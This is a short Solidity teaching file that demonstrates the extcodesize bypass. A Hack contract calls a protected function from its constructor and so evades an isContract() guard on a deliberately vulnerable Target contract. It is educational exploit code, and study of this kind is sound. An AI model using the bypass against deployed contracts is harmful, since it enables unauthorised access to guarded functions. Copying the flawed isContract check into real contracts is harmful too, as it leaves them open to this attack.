// Vulnerability
// If an address is a contract then the size of code stored at the address will be greater than 0 right?

// Let's see how we can create a contract with code size returned by extcodesize equal to 0.

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

contract Target {
    function isContract(address account) public view returns (bool) {
        // this method relies on extcodesize, which returns 0 for contracts in
        // construction, since the code is only stored at the end of the
        // constructor execution.
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    bool public pwned = false;

    function protected() external {
        require(!isContract(msg.sender), "no contract allowed");
        pwned = true;
    }
}

contract FailedAttack {
    // attempting to call Target.protected will fail,
    // target block calls from contract
    function pwn(address _target) external {
        // this will fail
        Target(_target).protected();
    }
}

contract Hack {
    bool public isContract;
    address public addr;

    // when contract is being created, code size(extcodesize) is 0.
    // this will bypass the isContract() check
    constructor(address _target) {
        isContract = Target(_target).isContract(address(this));
        addr = address(this);
        // this will work
        Target(_target).protected();
    }
}